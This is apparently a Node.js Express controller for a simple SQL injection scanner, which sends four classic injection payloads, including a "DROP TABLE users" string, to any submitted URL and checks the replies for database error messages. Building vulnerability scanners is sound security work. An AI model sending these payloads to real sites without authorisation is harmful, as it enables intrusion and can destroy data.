// controllers/sqliController.js
import fetch from "node-fetch"; // npm i node-fetch@2

const payloads = [
  "' OR '1'='1",
  "' OR '1'='1' -- ",
  "'; DROP TABLE users; --",
  "\" OR \"1\"=\"1",
];

export const scanSQLi = async (req, res) => {
  const { url } = req.body;

  if (!url) return res.status(400).json({ message: "URL is required" });

  try {
    let vulnerable = false;
    let details = [];

    for (const payload of payloads) {
      // add payload as query param e.g., ?test=' OR '1'='1
      const testUrl = `${url}?test=${encodeURIComponent(payload)}`;

      const response = await fetch(testUrl, { method: "GET", timeout: 5000 });
      const text = await response.text();

      // check for common SQL error patterns
      if (
        /sql syntax|mysql_fetch|ORA-|SQLite|unexpected end|warning|mysqli/i.test(text)
      ) {
        vulnerable = true;
        details.push({
          payload,
          status: response.status,
          foundError: true,
        });
      } else {
        details.push({
          payload,
          status: response.status,
          foundError: false,
        });
      }
    }

    res.json({
      url,
      vulnerable,
      message: vulnerable
        ? "⚠️ SQL Injection vulnerability detected!"
        : "✅ No SQL Injection detected.",
      details,
    });

  } catch (error) {
    console.error("Scan error:", error);
    res.status(500).json({ message: "Server error during SQLi scan" });
  }
};
